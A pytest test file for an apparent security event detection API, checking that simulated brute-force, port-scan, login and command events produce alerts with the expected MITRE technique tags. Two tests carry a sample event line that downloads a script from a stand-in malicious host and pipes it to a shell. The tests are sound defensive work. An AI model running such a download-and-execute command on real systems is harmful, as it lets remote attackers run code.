import pytest
from datetime import datetime, timedelta
from fastapi.testclient import TestClient
from app.main import app
from app.config import settings

client = TestClient(app)
API_KEY = settings.api_key or "your-static-api-key-here"

class TestDetectionEngine:
    """Test the detection engine rules."""

    def test_ssh_brute_force_detection(self, test_event_data):
        """Test SSH brute force detection rule."""
        # Send 6 failed login events (should trigger brute force)
        for i in range(6):
            event = test_event_data.copy()
            event["timestamp"] = (datetime.utcnow() + timedelta(seconds=i*5)).isoformat() + "Z"
            event["raw_event"] = f"Failed password attempt {i+1}"
            response = client.post(
                "/api/v1/events",
                json=event,
                headers={"X-API-Key": API_KEY}
            )
            assert response.status_code == 200

        # Check if brute force alert was created
        response = client.get("/api/v1/alerts")
        assert response.status_code == 200
        alerts = response.json()

        brute_force_alerts = [a for a in alerts if a.get("alert_type") == "ssh_brute_force"]
        assert len(brute_force_alerts) > 0, "SSH Brute Force alert not created"

        # Check MITRE mapping
        alert = brute_force_alerts[0]
        assert alert.get("mitre_technique") == "T1110"
        assert alert.get("severity") == "high"

    def test_port_scanning_detection(self, test_event_data):
        """Test port scanning detection rule."""
        # Send 4 failed login events (should trigger port scanning)
        for i in range(4):
            event = test_event_data.copy()
            event["timestamp"] = (datetime.utcnow() + timedelta(seconds=i*2)).isoformat() + "Z"
            event["source_ip"] = "192.168.1.100"
            event["raw_event"] = f"Connection attempt {i+1} on different port"
            response = client.post(
                "/api/v1/events",
                json=event,
                headers={"X-API-Key": API_KEY}
            )
            assert response.status_code == 200

        # Check if port scanning alert was created
        response = client.get("/api/v1/alerts")
        assert response.status_code == 200
        alerts = response.json()

        port_scan_alerts = [a for a in alerts if a.get("alert_type") == "port_scanning"]
        assert len(port_scan_alerts) > 0, "Port Scanning alert not created"

        # Check MITRE mapping
        alert = port_scan_alerts[0]
        assert alert.get("mitre_technique") == "T1046"
        assert alert.get("severity") == "medium"

    def test_suspicious_command_detection(self):
        """Test suspicious command detection rule."""
        event = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "host": "ubuntu-server",
            "source_ip": "10.10.10.20",
            "event_type": "command_execution",
            "username": "admin",
            "severity": "critical",
            "raw_event": "wget http://malicious.com/payload.sh | sh"
        }
        response = client.post(
            "/api/v1/events",
            json=event,
            headers={"X-API-Key": API_KEY}
        )
        assert response.status_code == 200

        # Check if suspicious command alert was created
        response = client.get("/api/v1/alerts")
        assert response.status_code == 200
        alerts = response.json()

        cmd_alerts = [a for a in alerts if a.get("alert_type") == "suspicious_command"]
        assert len(cmd_alerts) > 0, "Suspicious Command alert not created"

        # Check MITRE mapping
        alert = cmd_alerts[0]
        assert alert.get("mitre_technique") == "T1059"
        assert alert.get("severity") == "critical"

    def test_successful_login_after_failures(self, test_event_data):
        """Test successful login after failures detection."""
        # Send 3 failed logins
        for i in range(3):
            event = test_event_data.copy()
            event["timestamp"] = (datetime.utcnow() + timedelta(seconds=i*10)).isoformat() + "Z"
            event["source_ip"] = "10.10.10.50"
            response = client.post(
                "/api/v1/events",
                json=event,
                headers={"X-API-Key": API_KEY}
            )
            assert response.status_code == 200

        # Send successful login
        success_event = {
            "timestamp": (datetime.utcnow() + timedelta(seconds=30)).isoformat() + "Z",
            "host": "ubuntu-server",
            "source_ip": "10.10.10.50",
            "event_type": "ssh_success",
            "username": "admin",
            "severity": "medium",
            "raw_event": "Accepted password for admin from 10.10.10.50"
        }
        response = client.post(
            "/api/v1/events",
            json=success_event,
            headers={"X-API-Key": API_KEY}
        )
        assert response.status_code == 200

        # Check alert
        response = client.get("/api/v1/alerts")
        assert response.status_code == 200
        alerts = response.json()

        login_alerts = [a for a in alerts if a.get("alert_type") == "successful_login_after_failures"]
        assert len(login_alerts) > 0, "Successful Login After Failures alert not created"

        # Check MITRE mapping
        alert = login_alerts[0]
        assert alert.get("mitre_technique") == "T1078"

    def test_full_attack_chain(self, test_event_data):
        """Test complete attack chain from reconnaissance to execution."""
        source_ip = "10.10.10.99"

        # 1. Port Scanning (recon)
        for i in range(4):
            event = test_event_data.copy()
            event["timestamp"] = (datetime.utcnow() + timedelta(seconds=i*2)).isoformat() + "Z"
            event["source_ip"] = source_ip
            event["raw_event"] = f"Scan attempt {i+1}"
            client.post(
                "/api/v1/events",
                json=event,
                headers={"X-API-Key": API_KEY}
            )

        # 2. Brute Force (5 failed logins)
        for i in range(5):
            event = test_event_data.copy()
            event["timestamp"] = (datetime.utcnow() + timedelta(seconds=10 + i*5)).isoformat() + "Z"
            event["source_ip"] = source_ip
            event["raw_event"] = f"Brute force attempt {i+1}"
            client.post(
                "/api/v1/events",
                json=event,
                headers={"X-API-Key": API_KEY}
            )

        # 3. Successful Login
        success_event = {
            "timestamp": (datetime.utcnow() + timedelta(seconds=40)).isoformat() + "Z",
            "host": "ubuntu-server",
            "source_ip": source_ip,
            "event_type": "ssh_success",
            "username": "admin",
            "severity": "medium",
            "raw_event": "Accepted password for admin from " + source_ip
        }
        client.post(
            "/api/v1/events",
            json=success_event,
            headers={"X-API-Key": API_KEY}
        )

        # 4. Suspicious Command
        cmd_event = {
            "timestamp": (datetime.utcnow() + timedelta(seconds=50)).isoformat() + "Z",
            "host": "ubuntu-server",
            "source_ip": source_ip,
            "event_type": "command_execution",
            "username": "admin",
            "severity": "critical",
            "raw_event": "wget http://malicious.com/payload.sh | sh"
        }
        client.post(
            "/api/v1/events",
            json=cmd_event,
            headers={"X-API-Key": API_KEY}
        )

        # Check that incidents were created
        response = client.get("/api/v1/incidents")
        assert response.status_code == 200
        incidents = response.json()
        assert len(incidents) > 0

        # Check that multiple MITRE techniques were mapped
        response = client.get("/api/v1/alerts")
        assert response.status_code == 200
        alerts = response.json()

        # Get all MITRE techniques from alerts
        mitre_techniques = set()
        for alert in alerts:
            if alert.get("mitre_technique"):
                mitre_techniques.add(alert.get("mitre_technique"))

        # Should have at least T1046, T1110, T1078, T1059
        expected_techniques = {"T1046", "T1110", "T1078", "T1059"}
        found_techniques = mitre_techniques.intersection(expected_techniques)
        assert len(found_techniques) >= 3, f"Expected at least 3 MITRE techniques, found: {mitre_techniques}"